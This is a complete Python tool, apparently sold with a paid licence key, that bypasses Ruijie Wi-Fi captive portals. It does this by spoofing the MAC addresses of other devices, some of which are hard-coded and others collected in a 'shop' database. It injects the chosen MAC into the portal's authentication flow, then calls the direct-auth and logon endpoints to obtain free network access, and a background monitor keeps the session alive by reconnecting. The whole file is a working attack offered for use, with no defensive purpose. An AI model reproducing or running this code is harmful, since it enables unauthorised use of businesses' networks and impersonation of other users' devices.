import os
import re
import time
import socket
import json
import subprocess
import sys
import urllib3
import requests
import base64
import hashlib
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ==================== Disable warnings ====================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== Crypto (AES) ====================
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

KEY_HEX = "000102030405060708090a0b0c0d0e0f"
IV_HEX  = "101112131415161718191a1b1c1d1e1f"
_aes_key = bytes.fromhex(KEY_HEX)
_aes_iv  = bytes.fromhex(IV_HEX)

def aes_encrypt(plain_text):
    if HAS_CRYPTO:
        try:
            cipher = AES.new(_aes_key, AES.MODE_CBC, _aes_iv)
            return base64.b64encode(cipher.encrypt(pad(plain_text.encode(), AES.block_size))).decode()
        except: pass
    return base64.b64encode(plain_text.encode()).decode()

def aes_decrypt(token):
    if HAS_CRYPTO:
        try:
            cipher = AES.new(_aes_key, AES.MODE_CBC, _aes_iv)
            return unpad(cipher.decrypt(base64.b64decode(token)), AES.block_size).decode()
        except: pass
    return base64.b64decode(token).decode()

# ==================== COLOR CODES ====================
w    = "\033[1;00m"
g    = "\033[1;32m"
y    = "\033[1;33m"
r    = "\033[1;31m"
b    = "\033[1;34m"
RESET  = "\033[0m"
BOLD   = "\033[1m"
CYAN   = "\033[1;36m"
YELLOW = y; GREEN = g; RED = r; BLUE = b; WHITE = w

VERSION = "v2.1"

# ==================== CONFIG ====================
GITHUB_KEY_URL = "https://raw.githubusercontent.com/pdar6400-prog/lee-keys/main/key.json"
TOKEN_FILE = "/sdcard/.ruijie_token" if os.path.exists("/sdcard") else ".ruijie_token"
ID_FILE    = "/sdcard/.ruijie_id"    if os.path.exists("/sdcard") else ".ruijie_id"
SHOP_DB    = "/sdcard/.ruijie_shops.json" if os.path.exists("/sdcard") else ".ruijie_shops.json"

# Ruijie direct-auth endpoints (try in order, handles old HTTP + new HTTPS)
DIRECT_AUTH_ENDPOINTS = [
    "https://portal-as.ruijienetworks.com/api/auth/direct/?lang=en_US",
    "http://portal-as.ruijienetworks.com/api/auth/direct/?lang=en_US",
    "https://portal-as.ruijienetworks.com/api/auth/direct/",
]

# ==================== KEY SYSTEM ====================
PLAN_LABELS = {
    "30m": "30 Minutes", "7d": "7 Days",
    "1m":  "1 Month",    "unlimited": "Unlimited",
}

def get_device_id():
    if os.path.exists(ID_FILE):
        try:
            saved = open(ID_FILE).read().strip()
            if saved: return saved
        except: pass
    import platform, getpass, uuid
    base   = platform.node() + platform.processor() + platform.machine() + platform.platform()
    try:
        andr  = subprocess.check_output(['getprop','ro.serialno'], text=True, stderr=subprocess.DEVNULL).strip()
        andr += subprocess.check_output(['getprop','ro.build.id'],  text=True, stderr=subprocess.DEVNULL).strip()
    except: andr = ""
    entropy = base + andr + str(uuid.getnode()) + getpass.getuser() + str(os.cpu_count())
    hwid    = hashlib.sha256(entropy.encode()).hexdigest().upper()[:16]
    try: open(ID_FILE, 'w').write(hwid)
    except: pass
    return hwid

def load_local_token():
    if not os.path.exists(TOKEN_FILE): return None
    try:
        with open(TOKEN_FILE) as f: return json.load(f)
    except: return None

def save_local_token(data):
    try:
        with open(TOKEN_FILE, 'w') as f: json.dump(data, f, indent=2)
        return True
    except: return False

def delete_local_token():
    try:
        if os.path.exists(TOKEN_FILE): os.remove(TOKEN_FILE)
    except: pass

def fetch_key_db():
    """Download key.json from GitHub with retry."""
    for attempt in range(3):
        try:
            resp = requests.get(GITHUB_KEY_URL, timeout=10, verify=False)
            if resp.status_code == 200:
                return resp.json()
        except: pass
        if attempt < 2: time.sleep(1)
    return None

def verify_key_online(key_input, hwid):
    db = fetch_key_db()
    if db is None:
        return False, None, None, "Cannot connect to key server."
    key_input = key_input.strip().upper()
    if key_input not in db:
        return False, None, None, "Key not found."
    entry = db[key_input]
    if entry.get("hwid", "").upper() != hwid.upper():
        return False, None, None, "Key is bound to a different device."
    if not entry.get("active", True):
        return False, None, None, "Key has been revoked."
    plan      = entry.get("plan", "unlimited")
    exp_str   = entry.get("expires", None)
    expires_ts = None
    if exp_str:
        try:
            expires_ts = datetime.strptime(exp_str, "%Y-%m-%d %H:%M").timestamp()
            if time.time() > expires_ts:
                return False, None, None, f"Key expired on {exp_str}."
        except: pass
    return True, plan, expires_ts, "OK"

def is_token_valid(token, hwid):
    if not token: return False, "No token."
    if token.get("hwid","").upper() != hwid.upper(): return False, "HWID mismatch."
    exp = token.get("expires_ts")
    if exp and time.time() > exp: return False, "Token expired."
    return True, "OK"

def format_time_left(expires_ts):
    if expires_ts is None: return f"{g}Unlimited{RESET}"
    secs = int(expires_ts - time.time())
    if secs <= 0:          return f"{r}Expired{RESET}"
    if secs < 3600:        return f"{y}{secs//60}m {secs%60}s{RESET}"
    if secs < 86400:       return f"{y}{secs//3600}h {(secs%3600)//60}m{RESET}"
    return f"{g}{secs//86400}d {(secs%86400)//3600}h{RESET}"

def check_activation():
    Logo()
    hwid  = get_device_id()
    token = load_local_token()
    valid, msg = is_token_valid(token, hwid)

    if valid:
        last_check = token.get("last_online_check", 0)
        if time.time() - last_check > 6 * 3600:
            print(f"\n{y}[*] Re-verifying with server...{RESET}")
            ok, plan, expires_ts, vmsg = verify_key_online(token["key"], hwid)
            if ok:
                token.update({"last_online_check": time.time(), "plan": plan, "expires_ts": expires_ts})
                save_local_token(token)
            else:
                delete_local_token(); valid = False; msg = vmsg

    if not valid:
        print(f"\n{r}[✗] {msg}{RESET}")
        Line()
        print(f"{BOLD}  Your Device ID :{RESET} {y}{hwid}{RESET}")
        print(f"{w}  Send this ID to the developer (Telegram: @naymin126653)")
        print(f"{w}  to get your activation key.{RESET}")
        Line()
        key_input = input(f"\n{y}[?] Enter Key: {RESET}").strip().upper()
        if not key_input:
            print(f"{r}[-] No key entered. Exiting.{RESET}"); sys.exit(1)
        print(f"{y}[*] Verifying...{RESET}")
        ok, plan, expires_ts, vmsg = verify_key_online(key_input, hwid)
        if not ok:
            print(f"\n{r}[✗] {vmsg}{RESET}"); time.sleep(2); sys.exit(1)
        token = {
            "key": key_input, "hwid": hwid, "plan": plan,
            "expires_ts": expires_ts, "activated_at": time.time(),
            "last_online_check": time.time(),
        }
        save_local_token(token)

    plan_label = PLAN_LABELS.get(token.get("plan","unlimited"), "Unknown")
    time_left  = format_time_left(token.get("expires_ts"))
    print(f"\n{g}[✓] ACTIVATED SUCCESSFULLY{RESET}")
    print(f"{w}      Device ID : {y}{hwid}{RESET}")
    print(f"{w}      Plan      : {y}{plan_label}{RESET}")
    print(f"{w}      Time Left : {time_left}")
    Line(); time.sleep(1.5)
    return True

# ==================== SHOP DATABASE ====================
def save_shop(mac, portal_url=None):
    try:
        shops = load_all_shops()
        shops[mac.upper()] = {
            "mac": mac.upper(),
            "portal_url": portal_url or "http://portal-as.ruijienetworks.com",
            "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M")
        }
        with open(SHOP_DB, "w") as f: json.dump(shops, f, indent=4)
        return True
    except: return False

def load_all_shops():
    default_macs = [
        "D4:29:A7:47:B9:9B", "3C:19:CB:DC:AD:45",
        "14:8F:34:B7:08:41", "00:C3:0A:52:A5:72",
    ]
    if not os.path.exists(SHOP_DB):
        shops = {m: {"mac": m, "portal_url": "http://portal-as.ruijienetworks.com", "last_seen": "Default"} for m in default_macs}
        with open(SHOP_DB, "w") as f: json.dump(shops, f, indent=4)
        return shops
    try:
        with open(SHOP_DB) as f: return json.load(f)
    except: return {}

def clear_all_shops():
    if os.path.exists(SHOP_DB): os.remove(SHOP_DB); return True
    return False

# ==================== UI HELPERS ====================
def clear(): os.system('cls' if os.name == 'nt' else 'clear')
def Line():
    try: print(f"{y}-{w}" * os.get_terminal_size().columns)
    except: print(f"{y}-{w}" * 40)

def Logo():
    clear()
    logo = f"""{b}
  ______   ________  ______   _______   __       __  __    __  __    __ 
 /      \\ /        |/      \\ /       \\ /  \\     /  |/  |  /  |/  |  /  |
/$$$$$$  |$$$$$$$$//$$$$$$  |$$$$$$$  |$$  \\   /$$ |$$ |  $$ |$$ |  $$ |
$$ \\__$$/    $$ |  $$ |__$$ |$$ |__$$ |$$$  \\ /$$$ |$$ |  $$ |$$  \\/$$/ 
$$      \\    $$ |  $$    $$ |$$    $$< $$$$  /$$$$ |$$ |  $$ | $$  $$<  
 $$$$$$  |   $$ |  $$$$$$$$ |$$$$$$$  |$$ $$ $$/$$ |$$ |  $$ |  $$$$  \\ 
/  \\__$$ |   $$ |  $$ |  $$ |$$ |  $$ |$$ |$$$/ $$ |$$ \\__$$ | $$ /$$  |
$$    $$/    $$ |  $$ |  $$ |$$ |  $$ |$$ | $/  $$ |$$    $$/ $$ |  $$ |
 $$$$$$/     $$/   $$/   $$/ $$/   $$/ $$/      $$/  $$$$$$/  $$/   $$/ {w}"""
    print(logo); Line()
    print(f"{w}      [*] Ruijie Smart Bypass {VERSION} - Auto Shop Detection")
    print(f"{w}      [*] Telegram: @naymin126653 / @donebro100")
    Line()

# ==================== NETWORK HELPERS ====================
def check_adb():
    try:
        result = subprocess.run(["adb","devices"], capture_output=True, text=True, timeout=5)
        lines  = result.stdout.splitlines()
        return any("device" in l and "offline" not in l for l in lines[1:] if l.strip())
    except: return False

def get_my_gateway():
    # Try local ip route
    for cmd in ["ip route", "ip -4 route"]:
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode()
            m   = re.search(r"default\s+via\s+([\d.]+)", out)
            if m: return m.group(1)
        except: pass
    # Try via ADB
    if check_adb():
        try:
            out = subprocess.check_output("adb shell ip route", shell=True, stderr=subprocess.DEVNULL).decode()
            m   = re.search(r"default\s+via\s+([\d.]+)", out)
            if m: return m.group(1)
        except: pass
    # Fallback: UDP trick
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close()
        parts = ip.split("."); parts[-1] = "1"
        return ".".join(parts)
    except: return "192.168.1.1"

def check_internet():
    """
    Triple-check: ping 8.8.8.8, TCP to 1.1.1.1:53, HTTP HEAD to clients3.google.com.
    Returns (is_online, ping_str). Any ONE succeeding = online.
    """
    ping_val = "Timed Out"
    ping_ok  = False
    try:
        flag = '-n' if os.name == 'nt' else '-c'
        out  = subprocess.check_output(
            ['ping', flag, '1', '-W', '1', '8.8.8.8'],
            stderr=subprocess.DEVNULL, universal_newlines=True, timeout=3
        )
        m = re.search(r"time[=<]([\d.]+)", out)
        if m: ping_val = f"{m.group(1)}ms"; ping_ok = True
    except: pass

    tcp_ok = False
    try:
        s = socket.create_connection(("1.1.1.1", 53), timeout=2); s.close(); tcp_ok = True
    except: pass

    http_ok = False
    if not ping_ok and not tcp_ok:
        try:
            requests.head("http://clients3.google.com/generate_204", timeout=3, verify=False)
            http_ok = True
        except: pass

    is_online = ping_ok or tcp_ok or http_ok
    if not ping_ok and (tcp_ok or http_ok): ping_val = "TCP OK"
    return is_online, ping_val

# ==================== PORTAL DETECTION ====================
_portal_cache = {"url": None, "ts": 0}
PORTAL_CACHE_TTL = 120

def get_portal_url_silent(force=False):
    global _portal_cache
    now = time.time()
    if not force and _portal_cache["url"] and (now - _portal_cache["ts"]) < PORTAL_CACHE_TTL:
        return _portal_cache["url"]

    gateway  = get_my_gateway()
    # Expanded probe list: HTTP + HTTPS, standard and :2060 port, captive check
    test_urls = [
        f"http://{gateway}",
        f"http://{gateway}:2060",
        f"https://{gateway}",
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://clients3.google.com/generate_204",
        "http://captive.apple.com",
    ]
    sess = requests.Session()
    sess.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36"})

    for url in test_urls:
        try:
            resp = sess.get(url, timeout=5, allow_redirects=True, verify=False)
            # Check redirect URL
            if "portal-as.ruijienetworks.com" in resp.url:
                _portal_cache = {"url": resp.url, "ts": time.time()}
                return resp.url
            # Check body for portal link (HTTP & HTTPS)
            for pattern in [
                r'(https?://portal-as\.ruijienetworks\.com[^\s"\'<>]+)',
                r'action=["\']([^"\']+ruijienetworks[^"\']+)["\']',
            ]:
                m = re.search(pattern, resp.text, re.I)
                if m:
                    found = m.group(1)
                    _portal_cache = {"url": found, "ts": time.time()}
                    return found
        except: continue
    return None

def replace_mac(url, new_mac):
    if "mac=" in url:
        return re.sub(r"(?<=mac=)[^&\s]+", new_mac, url)
    sep = "&" if "?" in url else "?"
    return url + sep + "mac=" + new_mac

# ==================== BYPASS CORE ====================
def _extract_sid(resp):
    """Extract sessionId from URL or response body/JSON."""
    # From redirect URL
    if "sessionId=" in resp.url:
        return resp.url.split("sessionId=")[1].split("&")[0]
    # From JSON body
    try:
        data = resp.json()
        for path in [["result","sessionId"], ["sessionId"], ["data","sessionId"]]:
            node = data
            for k in path:
                node = node.get(k) if isinstance(node, dict) else None
                if node is None: break
            if node: return str(node)
    except: pass
    # From HTML/text
    patterns = [
        r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{8,})',
        r'sid["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{8,})',
    ]
    for p in patterns:
        m = re.search(p, resp.text)
        if m: return m.group(1)
    return None

def _do_direct_auth(sess, sid):
    """
    POST to direct-auth endpoint.
    Tries all known endpoints and both old/new payload formats.
    Returns logonUrl string or None.
    """
    payloads = [
        {"phoneNumber": "", "sessionId": sid},
        {"sessionId": sid, "authType": "0"},
        {"session_id": sid, "phoneNumber": ""},
    ]
    for endpoint in DIRECT_AUTH_ENDPOINTS:
        for payload in payloads:
            try:
                resp = sess.post(endpoint, json=payload, timeout=10, verify=False)
                if resp.status_code == 429:
                    # Rate limited — back off
                    time.sleep(3); continue
                data = resp.json()
                # Try multiple paths for logonUrl
                for path in [
                    ["result","logonUrl"], ["logonUrl"], ["data","logonUrl"],
                    ["result","loginUrl"], ["loginUrl"],
                ]:
                    node = data
                    for k in path:
                        node = node.get(k) if isinstance(node, dict) else None
                        if node is None: break
                    if node and isinstance(node, str) and node.startswith("http"):
                        return node
            except: continue
    return None

def _do_logon(sess, logon_url):
    """
    Hit the logonUrl. Handles :2060 IP replacement and HTTPS fallback.
    Returns True on success.
    """
    urls_to_try = [logon_url]

    # If :2060 port → replace internal IP with Ruijie cloud IP
    if ":2060" in logon_url:
        cloud = re.sub(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", "10.44.77.240", logon_url)
        urls_to_try = [cloud, logon_url]

    # Also try HTTPS variant
    for u in list(urls_to_try):
        if u.startswith("http://"):
            urls_to_try.append(u.replace("http://", "https://", 1))

    for u in urls_to_try:
        try:
            resp = sess.get(u, timeout=10, verify=False)
            if resp.status_code in (200, 302, 301):
                return True
        except: continue
    return False

def run_bypass_for_mac(portal_url, mac, retries=3):
    """
    Full bypass flow with retry + back-off.
    Returns session ID string on success, None on failure.
    """
    for attempt in range(retries):
        try:
            # Build stage=portal API URL
            api_url = portal_url
            if "/auth/wifidogAuth/login" in api_url:
                api_url = api_url.replace("/auth/wifidogAuth/login", "/api/auth/wifidog?stage=portal&")
            elif "/api/auth/wifidog" not in api_url:
                # Append stage=portal if missing
                sep = "&" if "?" in api_url else "?"
                api_url = api_url + sep + "stage=portal&"
            api_url = api_url.replace("??", "?")
            api_url = replace_mac(api_url, mac)

            sess = requests.Session()
            sess.headers.update({
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Generic Build)",
                "Accept": "application/json, text/plain, */*",
            })

            # Step 1: Get session ID
            resp1 = sess.get(api_url, timeout=10, verify=False, allow_redirects=True)
            sid   = _extract_sid(resp1)

            # Fallback: try HTTPS version of same URL
            if not sid and api_url.startswith("http://"):
                try:
                    resp1h = sess.get(api_url.replace("http://","https://",1), timeout=8, verify=False, allow_redirects=True)
                    sid    = _extract_sid(resp1h)
                except: pass

            if not sid:
                if attempt < retries - 1: time.sleep(1 + attempt)
                continue

            # Step 2: Direct auth → get logonUrl
            logon = _do_direct_auth(sess, sid)
            if not logon:
                if attempt < retries - 1: time.sleep(1 + attempt)
                continue

            # Step 3: Hit logonUrl
            if _do_logon(sess, logon):
                return sid

        except Exception:
            pass

        if attempt < retries - 1:
            time.sleep(1 + attempt)

    return None

# ==================== STABLE MONITOR ====================
def monitor_connection(mac, portal_url, interval=3):
    REFRESH_INTERVAL = 40
    FAIL_THRESHOLD   = 4
    MAX_BACKOFF      = 16

    save_shop(mac, portal_url)

    state = {
        "session_id":         None,
        "reconnecting":       False,
        "reconnect_attempts": 0,
        "last_refresh":       time.time(),
        "last_status_msg":    "",
        "portal_url":         portal_url,
        "total_reconnects":   0,
    }
    state_lock = threading.Lock()
    stop_event  = threading.Event()

    # ── Background reconnect thread ──
    def reconnect_worker():
        backoff = 1
        while not stop_event.is_set():
            with state_lock:
                if not state["reconnecting"]:
                    time.sleep(0.5); continue
                cur_portal = state["portal_url"]
                attempt_no = state["reconnect_attempts"]

            portals_to_try = [cur_portal]
            if attempt_no > 0:
                fresh = get_portal_url_silent(force=(attempt_no % 3 == 0))
                if fresh and fresh != cur_portal:
                    portals_to_try.insert(0, fresh)

            sid = None
            for p in portals_to_try:
                sid = run_bypass_for_mac(p, mac, retries=2)
                if sid:
                    with state_lock:
                        state.update({
                            "session_id": sid, "portal_url": p,
                            "reconnecting": False, "reconnect_attempts": 0,
                            "last_refresh": time.time(),
                            "total_reconnects": state["total_reconnects"] + 1,
                            "last_status_msg": f"{g}[✓] Reconnected! SID: {sid[:8]}...{RESET}",
                        })
                    backoff = 1; break

            if sid is None:
                with state_lock:
                    state["reconnect_attempts"] += 1
                    state["last_status_msg"] = (
                        f"{r}[!] Reconnect #{state['reconnect_attempts']} failed. "
                        f"Retry in {backoff}s...{RESET}"
                    )
                time.sleep(backoff)
                backoff = min(backoff * 2, MAX_BACKOFF)

    threading.Thread(target=reconnect_worker, daemon=True).start()

    ping_history = []
    fail_count   = 0

    # ── Initial connect ──
    print(f"\n{y}[*] Connecting...{RESET}")
    init_sid = run_bypass_for_mac(portal_url, mac, retries=3)
    if init_sid:
        with state_lock:
            state["session_id"]  = init_sid
            state["last_refresh"] = time.time()
        print(f"{g}[+] Connected! SID: {init_sid[:8]}...{RESET}")
    else:
        print(f"{r}[!] Initial connect failed — retrying in background.{RESET}")
        with state_lock: state["reconnecting"] = True
    time.sleep(1)

    start_time = time.time()

    # ── Main loop ──
    try:
        while True:
            is_online, ping_val = check_internet()
            now = time.time()

            ping_history.append(f"{g if is_online else r}{ping_val}{RESET}")
            if len(ping_history) > 5: ping_history.pop(0)

            with state_lock:
                sid          = state["session_id"]
                reconnecting = state["reconnecting"]
                last_refresh = state["last_refresh"]
                status_msg   = state["last_status_msg"]
                cur_portal   = state["portal_url"]
                total_recon  = state["total_reconnects"]

            # Pre-emptive refresh
            if is_online and not reconnecting and (now - last_refresh) >= REFRESH_INTERVAL:
                new_sid = run_bypass_for_mac(cur_portal, mac, retries=2)
                with state_lock:
                    state["last_refresh"] = now
                    if new_sid:
                        state["session_id"]      = new_sid
                        state["last_status_msg"] = f"{g}[↻] Session refreshed OK{RESET}"
                        sid = new_sid
                    else:
                        state["last_status_msg"] = f"{y}[~] Refresh failed, retry in {REFRESH_INTERVAL}s{RESET}"
                status_msg = state["last_status_msg"]

            # Fail detection
            fail_count = 0 if is_online else fail_count + 1
            if fail_count >= FAIL_THRESHOLD and not reconnecting:
                with state_lock:
                    state.update({
                        "reconnecting": True, "reconnect_attempts": 0,
                        "last_status_msg": f"{r}[!] Drop detected! Reconnecting...{RESET}",
                    })
                status_msg = state["last_status_msg"]

            # Uptime
            up = int(now - start_time)
            uptime_str = f"{up//3600}h {(up%3600)//60}m {up%60}s"

            # Draw UI
            clear(); Logo()
            print(f"\n{g}      [+] ULTRA-STABLE MONITOR ACTIVE {VERSION}{w}")
            print(f"{w}      [+] Target MAC   : {y}{mac}{w}")
            p_display = cur_portal if len(cur_portal) <= 48 else cur_portal[:45] + "..."
            print(f"{w}      [+] Portal       : {y}{p_display}{w}")
            sid_display = f"{sid[:8]}..." if sid else f"{r}None{RESET}"
            print(f"{w}      [+] Session ID   : {y}{sid_display}{w}")
            print(f"{w}      [+] Next Refresh : {y}{max(0, int(REFRESH_INTERVAL-(now-last_refresh)))}s{w}")
            print(f"{w}      [+] Uptime        : {y}{uptime_str}{w}")
            print(f"{w}      [+] Reconnects    : {y}{total_recon}{w}")
            Line()

            net_str  = f"{g}ONLINE{RESET}"  if is_online else f"{r}OFFLINE{RESET}"
            recon_fl = f"  {y}[RECONNECTING...]{RESET}" if reconnecting else ""
            print(f"{BOLD}[{CYAN}📶 NETWORK{RESET}{BOLD}] Status : {net_str}{recon_fl}")
            print(f"{BOLD}[{CYAN}📊 PINGS{RESET}{BOLD}]  History: {w} | {' | '.join(ping_history)} |")
            if status_msg:
                print(f"{BOLD}[{CYAN}ℹ  INFO{RESET}{BOLD}]  {status_msg}")
            Line()

            time.sleep(interval)

    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{y}[!] Monitor stopped.{RESET}")

# ==================== SMART AUTO-CONNECT ====================
def action_smart_autoconnect():
    Logo()
    print(f"\n{BLUE}⚡  SMART AUTO-CONNECT  ⚡{RESET}"); Line()
    print(f"1. {g}Auto-Connect (Saved MACs){RESET}")
    print(f"2. {y}Manual Add & Connect{RESET}")
    Line()
    choice = input(f"{y}Select Option: {RESET}").strip()

    print(f"\n{y}[*] Detecting portal URL...{RESET}")
    portal_url = get_portal_url_silent()
    if not portal_url:
        print(f"{r}[-] Portal not found. Are you connected to Ruijie WiFi?{RESET}")
        time.sleep(2); return

    print(f"{g}[+] Portal: {portal_url[:60]}{RESET}")

    if choice == '2':
        mac = input(f"{y}Enter MAC Address (e.g. AA:BB:CC:DD:EE:FF): {RESET}").strip().upper()
        if not re.match(r"^([0-9A-F]{2}:){5}[0-9A-F]{2}$", mac):
            print(f"{r}[-] Invalid MAC format.{RESET}"); time.sleep(2); return
        save_shop(mac, portal_url)
        print(f"{y}[*] Connecting to {mac}...{RESET}")
        if run_bypass_for_mac(portal_url, mac):
            print(f"{g}[+] Success!{RESET}"); time.sleep(1)
            monitor_connection(mac, portal_url); return
    else:
        shops = load_all_shops()
        if not shops:
            print(f"{r}[-] No saved MACs.{RESET}"); time.sleep(2); return
        print(f"{y}[*] Testing {len(shops)} MACs...{RESET}")
        for mac in list(shops.keys()):
            print(f"  {y}→ {mac}...{RESET}", end=" ", flush=True)
            if run_bypass_for_mac(portal_url, mac):
                print(f"{g}OK!{RESET}")
                time.sleep(1)
                monitor_connection(mac, portal_url); return
            else:
                print(f"{r}fail{RESET}")

    print(f"\n{r}[-] No MACs worked. Try adding a new MAC manually.{RESET}")
    time.sleep(2)

# ==================== MAIN ====================
def main():
    if check_activation():
        while True:
            Logo()
            print(f"1. {g}⚡ Smart Auto-Connect{RESET}")
            print(f"2. {b}📂 View Saved MAC Database{RESET}")
            print(f"3. {y}🗑️  Clear Saved Data{RESET}")
            print(f"4. {r}❌ Exit{RESET}")
            Line()
            choice = input(f"\n{y}Select Option: {RESET}").strip()
            if choice == '1':
                action_smart_autoconnect()
            elif choice == '2':
                Logo(); shops = load_all_shops()
                if not shops:
                    print(f"{y}No saved MACs.{RESET}")
                else:
                    print(f"\n  {'#':<4} {'MAC':<20} {'Last Seen':<18} Portal")
                    Line()
                    for i, (mac, info) in enumerate(shops.items(), 1):
                        print(f"  {g}{i:<4}{w}{mac:<20} {info.get('last_seen','?'):<18} {info.get('portal_url','?')[:40]}")
                Line(); input(f"\n{y}Press Enter to go back...{RESET}")
            elif choice == '3':
                confirm = input(f"{r}Clear all saved data? (yes/no): {RESET}").strip().lower()
                if confirm == "yes":
                    clear_all_shops()
                    print(f"{g}[+] Data cleared!{RESET}")
                else:
                    print(f"{y}Cancelled.{RESET}")
                time.sleep(1)
            elif choice == '4':
                break

if __name__ == "__main__":
    main()
